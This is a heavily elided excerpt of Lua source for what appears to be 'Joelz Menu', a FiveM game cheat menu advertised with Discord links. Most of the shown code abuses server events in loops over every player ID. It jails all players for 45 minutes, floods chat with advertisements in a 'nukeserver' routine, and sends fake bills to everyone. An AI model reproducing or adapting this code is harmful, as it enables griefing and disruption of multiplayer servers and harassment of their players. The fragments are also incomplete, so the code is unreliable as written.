...
function Plane.CreateMenu(id, title)
    ...
    menus[id].menuFocusBackgroundColor = { r = 300, g = 20, b = 30, a = 120 }
                    ...
                    function()
                        ...
                        for i = 0, 256 do
                            ...
                            TriggerServerEvent(
                                ...
                                GetPlayerServerId(i),
                                'Purposeless',
                                'Plane#0007 Joelz https://discord.gg/hkZgrv3',
                                43161337
                            )
...
function nukeserver()
    Citizen.CreateThread(function()
        ...
        for bs=0,9 do
            TriggerServerEvent("_chat:messageEntered","~r~",{141,211,255},"Joelz; Plane#0007")
        end
        ...
        while true do
			...
			if chatspam then
                TriggerServerEvent(
                    ...
                    'Plane#0007',
                    {0, 0x99, 255},
                    '/ooc Joelz Menu! Buy at https://discord.gg/hkZgrv3'
                )
                TriggerServerEvent('_chat:messageEntered', 'Plane#0007', {0, 0x99, 255}, 'Joelz menu <3 https://discord.gg/hkZgrv3')
            end
			...
			if banallusers then
				...
				TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "Joelz Babe <3 Plane#0007 https://discord.gg/hkZgrv3")
				TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 45 * 60, "Joelz Babe <3 Plane#0007 https://discord.gg/hkZgrv3")
					end
				end
...
Citizen.CreateThread(
    function()
        ...
        Plane.CreateMenu("MainMenu", "Joelz Menu")
        ...
        while Enabled do
            if Plane.IsMenuOpened("MainMenu") then
                drawNotification("~h~~b~Joelz ~s~Menu")
            ...
            elseif Plane.IsMenuOpened("TrollMenu") then
				...
				for i = 0, 128 do
                    TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Joelz menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Joelz menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Joelz menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Joelz menu https://discord.gg/kYyhww", "6969696969")
					TriggerServerEvent('esx_billing:sendBill', GetPlayerServerId(i), "Purposeless", "Joelz menu https://discord.gg/kYyhww", "6969696969")
        ...
        drawNotification(
            "You are not sitting in a vehicle mate"
                ...
                elseif Plane.Button("Spawn a vehicle") then
					...
					local playerVeh = GetVehiclePedIsIn(playerPed, true)
						SetVehicleNumberPlateText(playerVeh, "Joelz")
                    else
            ...
            elseif IsDisabledControlPressed(0, 162) then
                if logged then
                    ...
                    local temp = KeyboardInput("Enter Password", "1234", 100)
                    if temp == pass then
